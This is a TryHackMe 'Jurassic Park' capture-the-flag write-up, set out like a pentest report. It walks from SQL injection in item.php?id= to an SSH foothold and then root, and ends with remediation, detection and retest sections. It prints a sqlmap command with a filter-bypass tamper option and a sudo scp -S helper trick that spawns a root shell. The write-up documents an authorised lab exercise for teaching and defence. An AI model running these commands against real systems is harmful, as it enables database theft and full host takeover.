---
title: "TryHackMe: Jurassic Park"
date: 2026-06-21 23:55:00 +0200
categories: [TryHackMe]
tags:
  - linux
  - web
  - sql-injection
  - mysql
  - credential-exposure
  - ssh
  - sudo
  - scp
  - privilege-escalation
description: >-
  Jurassic Park chains unauthenticated SQL injection, plaintext credential
  disclosure, SSH access, and an unsafe NOPASSWD scp rule into complete
  root compromise of the Linux host.
author: lenovolegion7
media_subpath: /images/tryhackme_jurassic_park
image:
  path: room_image.webp
  alt: "Original TryHackMe Jurassic Park room artwork"
toc: true
comments: false
---

Jurassic Park is a Linux web challenge built around SQL injection, credential exposure, and unsafe sudo configuration. The validated path began with an unauthenticated injectable `item.php?id=` parameter, exposed a reusable local credential from the application database, obtained SSH access as `dennis`, and ended with a root shell through unrestricted `sudo` access to `scp`.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Jurassic Park room card](room_card.webp){: w="300" h="268" .shadow }](https://tryhackme.com/room/jurassicpark){: .center }

## Executive Summary

The target exposed only two TCP services:

```text
22/tcp  SSH
80/tcp  HTTP
```

The validated attack path was:

1. enumerate the public web application and identify `/shop.php`;
2. follow item links to the dynamic `/item.php?id=` endpoint;
3. confirm SQL error behavior with malformed input;
4. bypass the application's simple filtering with sqlmap's `space2comment` tamper script;
5. enumerate the `park` database and recover plaintext password values;
6. validate one recovered credential against the local `dennis` SSH account;
7. obtain an interactive Linux shell as `dennis`;
8. identify `NOPASSWD` sudo access to `/usr/bin/scp`;
9. abuse `scp -S` to execute an attacker-controlled helper as root;
10. retrieve the final root-only objective.

> **Result:** Unauthenticated web access was converted into full root compromise through SQL injection, plaintext credential reuse, and an unsafe sudo rule.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe laboratory host.

The source report records a time-boxed black-box assessment. No persistence, denial of service, service disruption, or testing outside the supplied target was performed.

The room intentionally contains **no fourth flag**. The validated objectives therefore cover Flags 1, 2, 3, and 5 only.

## Initial Enumeration

Service discovery identified OpenSSH and Apache:

```console
$ nmap \
  -p22,80 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

Observed services:

```text
22/tcp  SSH   OpenSSH 7.2p2 Ubuntu 4ubuntu2.6
80/tcp  HTTP  Apache 2.4.18 on Ubuntu
```

The HTTP service hosted the themed Jurassic Park shop application, while SSH later provided the operating-system foothold.

## Web Enumeration

The landing page linked to:

```text
/shop.php
```

The shop then linked to item routes such as:

```text
/item.php?id=1
/item.php?id=2
/item.php?id=3
```

Changing the `id` returned different records, confirming a database-backed parameter. Supplying a single quote generated a MySQL syntax error page, strongly indicating SQL injection.

Additional contextual files included:

```text
/robots.txt
/delete
/requests.txt
```

The source report treats these as clues rather than direct compromise paths.

## SQL Injection

Default sqlmap testing was initially affected by the application's input filtering. The validated bypass used the `space2comment` tamper script:

```console
$ sqlmap \
  -u "http://TARGET_IP/item.php?id=1" \
  --batch \
  --level 5 \
  --risk 3 \
  --random-agent \
  --tamper=space2comment \
  --current-db \
  --banner \
  --dbs
```

The injection point was:

```text
GET /item.php?id=1
```

The source report confirmed boolean-based, error-based, and time-based SQL injection techniques.

Database enumeration returned:

```text
Back-end DBMS: MySQL 5.7.25-0ubuntu0.16.04.2
Current database: park
Tables: items, users
```

The `items` table contained five columns:

```text
id
sold
price
package
information
```

The `users` table disclosed plaintext password values. Those values are intentionally not published:

```text
Database: park
Table: users

id | password   | username
1  | [REDACTED] | <empty>
2  | [REDACTED] | <empty>
```

One recovered value was subsequently validated against the known local `dennis` account over SSH.

## SSH Foothold as Dennis

The recovered credential authenticated successfully to OpenSSH:

```console
$ ssh dennis@TARGET_IP
```

The password is redacted:

```text
dennis : [REDACTED]
```

The resulting shell identity was:

```text
uid=1001(dennis) gid=1001(dennis) groups=1001(dennis)
```

Three authorized objectives were recovered from the user-accessible context.

Flag 1 path:

```text
/home/dennis/flag1.txt
```

Flag 2 path:

```text
/boot/grub/fonts/flagTwo.txt
```

Flag 3 source:

```text
/home/dennis/.bash_history
```

Their values are published only as:

```text
THM{[REDACTED]}
```

## Privilege Escalation Through sudo scp

Local privilege enumeration showed:

```console
$ sudo -l
```

Relevant sudo rule:

```text
(ALL) NOPASSWD: /usr/bin/scp
```

`scp` accepts the `-S` option to choose the program used for SSH transport. Because the sudo rule allowed unrestricted arguments, a local helper could be supplied and executed under sudo.

The validated source-report technique was:

```console
$ TF=$(mktemp)
$ echo 'sh 0<&2 1>&2' > "$TF"
$ chmod +x "$TF"
$ sudo /usr/bin/scp -S "$TF" x y:
```

The resulting identity was:

```text
root
```

This demonstrated unrestricted root command execution from the `dennis` foothold.

## Final Objective

The final root-only objective was located at:

```text
/root/flag5.txt
```

Its value is redacted:

```text
THM{[REDACTED]}
```

The source report explicitly confirms that the room contains no Flag 4.

## Findings

### F-01 - SQL Injection in item.php

- **Severity:** Critical
- **Affected endpoint:** `GET /item.php?id=`
- **Precondition:** network access only
- **Impact:** full application database disclosure and credential theft

The application incorporated the `id` parameter into a MySQL query without safe parameterization. The filtering layer did not prevent exploitation and was bypassed with SQL comments.

**Remediation:**

- replace string-built SQL with prepared statements and bound parameters;
- enforce numeric validation for item identifiers;
- suppress verbose database errors from client responses;
- do not rely on blacklist filtering or a WAF as the primary SQL injection control;
- restrict the application database account to minimum required privileges.

### F-02 - Plaintext and Reused Account Password

- **Severity:** High
- **Affected data:** `park.users` password column
- **Compromised account:** `dennis`
- **Impact:** direct SSH account takeover

The application database stored password values in plaintext. One recovered value was reused by the local Linux account.

**Remediation:**

- rotate the `dennis` password and any credential sharing the exposed value;
- store passwords using a modern adaptive password hash such as Argon2id or bcrypt with unique salts;
- prohibit credential reuse across application, database, and operating-system accounts;
- prefer SSH public-key authentication;
- monitor use of known exposed credentials.

### F-03 - Unrestricted NOPASSWD sudo Access to scp

- **Severity:** Critical
- **Affected account:** `dennis`
- **Sudo rule:** `(ALL) NOPASSWD: /usr/bin/scp`
- **Impact:** arbitrary command execution as root

Unrestricted arguments to `scp` allowed the `-S` helper-program option to execute attacker-controlled code with root privileges.

**Remediation:**

- remove the sudo rule for `scp`;
- use a root-owned wrapper with fixed source, destination, options, and file types where privileged transfer is required;
- avoid `NOPASSWD` rules for general-purpose binaries with helper-program or shell-escape functionality;
- audit sudoers against GTFOBins-style escape paths;
- alert on unusual `scp` options, especially `-S`.

### F-04 - Sensitive Data Retained in Shell History and Unusual Readable Paths

- **Severity:** Medium
- **Observed locations:** `/home/dennis/.bash_history` and `/boot/grub/fonts/flagTwo.txt`
- **Impact:** sensitive values recoverable through routine local enumeration

The assessment found sensitive objective data in shell history and in a non-obvious but readable system path. Equivalent production practices could expose credentials, tokens, commands, or operational data.

**Remediation:**

- do not place secrets directly on command lines;
- use protected prompts or secret-management tooling;
- review and securely clear sensitive shell history;
- store sensitive files in approved locations with restrictive permissions;
- deploy secret scanning across user and configuration data.

### F-05 - Legacy End-of-Life Operating System and Services

- **Severity:** Medium
- **Operating system:** Ubuntu 16.04.5 LTS (Xenial)
- **Observed services:** OpenSSH 7.2p2, Apache 2.4.18, MySQL 5.7.25
- **Impact:** expanded attack surface and reduced security support

The host used an obsolete operating-system release and legacy service versions.

**Remediation:**

- migrate to a supported Ubuntu LTS release;
- upgrade Apache, OpenSSH, PHP, and MySQL to supported versions;
- apply all relevant security updates;
- establish routine patch management;
- rebuild the application on a maintained platform rather than relying on an in-place upgrade of an already compromised host;
- use segmentation and host firewall allowlists during migration.

## Security Impact

The validated chain provided complete control of the Linux host from an unauthenticated remote position.

An attacker with equivalent access could:

- extract application database content without authentication;
- recover plaintext account credentials;
- reuse application credentials against SSH;
- obtain an interactive shell as a local user;
- read sensitive files accessible to that user;
- escalate directly to root through unsafe sudo configuration;
- read or modify all local data and security controls available to root.

The compromise depended on two decisive control failures: unsafe SQL construction exposed reusable credentials, and the unrestricted `scp` sudo rule converted the resulting user foothold into full root access.

## Detection Opportunities

Useful monitoring controls include:

- alert on repeated malformed or comment-heavy requests to `item.php?id=`;
- monitor SQL errors and anomalous query timing;
- detect automated SQL injection tooling patterns;
- alert on bulk database enumeration from the web application account;
- monitor SSH authentication using credentials recovered from application data;
- alert on `sudo` execution of `scp` with unusual arguments;
- specifically detect use of the `-S` helper option under sudo;
- scan shell history and readable filesystem locations for exposed secrets;
- monitor legacy service exposure and unsupported operating-system versions.

## Remediation Priorities

1. Disable or patch the vulnerable `item.php?id=` endpoint immediately.
2. Replace dynamic SQL construction with prepared statements and parameter binding.
3. Remove the `NOPASSWD` sudo rule for `/usr/bin/scp`.
4. Rotate the `dennis` password and every exposed application credential.
5. Replace plaintext password storage with modern adaptive hashing.
6. Prohibit password reuse between application and operating-system identities.
7. Restrict SSH exposure and prefer public-key authentication.
8. Scrub sensitive shell history and review unusual readable data locations.
9. Audit the complete sudoers configuration for executable escape paths.
10. Migrate Ubuntu 16.04 and legacy services to supported versions.
11. Implement centralized logging, secrets scanning, and continuous vulnerability management.

## Retest Plan

1. Confirm malformed `id` values no longer produce SQL errors.
2. Verify boolean-, error-, and time-based SQL injection against `item.php?id=` is no longer possible.
3. Confirm the web database account cannot retrieve data outside required application tables.
4. Verify plaintext credentials are absent from the `park.users` table.
5. Confirm the previously exposed `dennis` password no longer authenticates to SSH.
6. Verify password reuse controls prevent application credentials from matching local-system credentials.
7. Confirm `sudo -l` no longer grants unrestricted `NOPASSWD` access to `/usr/bin/scp`.
8. Verify `scp -S` cannot execute an arbitrary helper with elevated privileges.
9. Confirm sensitive values are absent from shell history and inappropriate filesystem locations.
10. Verify the host and exposed services run supported versions.
11. Confirm the previous attack chain no longer results in a root shell.

## Lessons Learned

Jurassic Park demonstrates how a straightforward public web weakness can become a complete host compromise when credential and privilege boundaries are weak.

SQL injection exposed the application database without authentication. Plaintext password storage and credential reuse converted that database disclosure directly into SSH access. The final security boundary then failed because a general-purpose binary with a helper-program execution path was granted unrestricted passwordless sudo access.

The strongest defensive response is therefore to treat database query safety, password storage, credential reuse, SSH authentication, and sudo policy as one connected attack surface rather than isolated configuration issues.
